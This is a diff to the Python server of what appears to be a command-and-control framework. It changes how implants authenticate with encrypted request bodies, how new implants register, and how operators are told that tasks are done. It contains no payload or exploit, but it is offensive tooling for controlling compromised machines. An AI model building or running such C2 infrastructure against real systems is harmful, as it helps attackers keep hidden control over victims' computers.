@@ -40,20 +40,21 @@ def implant_authenticated(func: Callable):
         if implant is None:
             return "Unauthorized", 401
 
-        # Decrypt the request body
-        try:
-            if request.get_data():
+    
+        if request.get_data():
+            try:
                 raw_decrypted = decrypt_b64(
-                    implant.implant_pk, implant.server_sk, request.get_data()
-                )
+                implant.implant_pk, implant.server_sk, request.get_data()
+            )
                 decrypted = json.loads(raw_decrypted)
-                return func(*args, **kwargs, decrypted_body=decrypted)
-            else:
-                return func(*args, **kwargs)
+            except Exception as e:
+                logger.error(f"Failed to decrypt request body: {e}: {request.get_data()}")
+                return "Failed to decrypt", 401
+            return func(*args, **kwargs, decrypted_body=decrypted)
+        else:
+            return func(*args, **kwargs)
 
-        except Exception as e:
-            logger.error(f"Failed to decrypt request body: {e}: {request.get_data()}")
-            return "Failed to decrypt", 401
+       
 
     return wrapper
 
@@ -117,7 +118,7 @@ def register():
     db.session.add(config)
     db.session.commit()
 
-    send_message_to_all_queues("Client connected")
+    send_message_to_all_queues(f"New implant registered: {implant.implant_id}")
 
     resp_body = json.dumps(
         {
@@ -215,8 +216,8 @@ def post_task(decrypted_body: Optional[Dict[str, Union[str, bool]]] = None):
         task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         db.session.commit()
 
-        op = Operator.filter(Operator.id == task.operator_id).first()
-        send_message_to_operator(op, "Task completed")
+        op = Operator.query.filter_by(username=task.operator_name).first()
+        send_message_to_operator(op, f"Task {task.tid} completed")
 
         return "OK"
     # If task is None, return empty task
